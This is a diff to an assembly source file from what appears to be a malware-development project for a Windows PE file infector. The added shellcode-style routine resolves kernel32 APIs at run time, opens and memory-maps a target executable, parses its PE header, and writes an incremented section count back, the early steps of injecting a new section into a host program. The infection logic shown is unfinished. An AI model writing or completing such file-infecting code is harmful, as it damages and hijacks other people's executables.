@@ -33,6 +33,14 @@ start_code:
 	mov [ebp - 60], eax		;VA WriteFile
 	mov [ebp - 64], eax		;VA CloseHandle
 
+	mov [ebp - 68], eax		;File Handle
+	mov [ebp - 72], eax		;File size
+	mov [ebp - 76], eax		;File Mapping Handle
+	mov [ebp - 80], eax		;File mapview address
+	mov [ebp - 84], eax		;New number of sections
+	mov [ebp - 88], eax		;SizeofOptionalHeader
+	
+
 	lea eax, [ebx + offset wszKernel32]
 	push eax
 	call GetModuleBase
@@ -189,9 +197,90 @@ start_code:
 	jz Exit
 	mov [ebp - 64], eax		;VA CloseHandle
 
+;CreateFileA to infect
+	push 0
+	push 80h				;FILE_ATTRIBUTE_NORMAL		
+	push 3					;OPEN_EXISTING
+	push 0
+	push 0
+	push 0c0000000h			;GENERIC_WRITE | GENERIC_READ
+	lea eax, [ebx + offset sFilePath]
+	push eax
+	mov eax, [ebp - 32]		;VA CreateFileA
+	call eax
+	test eax, eax
+	jz Exit
+	mov [ebp - 68], eax		;File Handle
+
+;GetFileSize
+	push 0
+	push eax				
+	mov eax, [ebp - 36]		;GetFileSize
+	call eax
+	test eax, eax
+	jz Exit
+	mov [ebp - 72], eax
+
+;CreateFileMappingA
+	push 0
+	push eax				;Filesize
+	push 0
+	push 4					;PAGE_READWRITE
+	push 0
+	push [ebp - 68]			;File handle
+	mov eax, [ebp - 40]		;VA CreateFileMappingA
+	call eax
+	test eax, eax
+	jz Exit
+	mov [ebp - 76], eax		;File Mapping Handle
+
+;MapViewOfFile
+	push [ebp - 72]
+	push 0
+	push 0
+	push 2					;FILE_MAP_WRITE (READ/WRITE)
+	push [ebp - 76]			;File Mapping Handle
+	mov eax, [ebp - 44]		;VA MapViewOfFile
+	call eax
+	test eax, eax
+	jz Exit
+	mov [ebp - 80], eax
+
+;Parse PE
+;Get number of sections
+	mov esi, [ebp - 80]
+	add esi, [esi + 03ch]	;pointer to nt header
+	add esi, 6				;pointer number of sections
+	mov ax, word ptr[esi]	;number of sections
+	inc ax
+	mov word ptr[ebp - 84], ax		;New number of sections
+
+;Fix new number of sections
+;SetFilePointer
+	push 0					;FILE_BEGIN
+	push 0
+	mov eax, esi
+	sub eax, [ebp - 80]		;offset from begin file
+	push eax
+	push [ebp - 68]			;File handle
+	mov eax, [ebp - 52]		;SetFilePointer
+	call eax
+
+;Write new number sections
+	push 0
+	push 0
+	push 2					;Write 2 bytes
+	lea eax, [ebp - 84]		;address of new number of sections
+	push eax
+	push [ebp - 68]			;File handle
+	mov eax, [ebp - 60]		;VA WriteFile
+	call eax
+
+;Get size of opt
 
 
-	xor eax, eax
+
+
 Exit:
 	mov esp, ebp
 	pop ebp
@@ -407,7 +496,7 @@ EndToLower:
 	pop ebp
 	ret
 ToLower endp
-
+	sFilePath db "C:\Users\levuong\Documents\GitHub\MalDev\FileInfection\Debug\ShellCode.exe", 0
 	wszKernel32 dw 'c',':','\','w','i','n','d','o','w','s','\','s','y','s','t','e','m','3','2','\','k','e','r','n','e','l','3','2','.', 'd','l','l', 0
 	sUser32 db "User32.dll", 0
 	sLoadLibraryA db "LoadLibraryA", 0
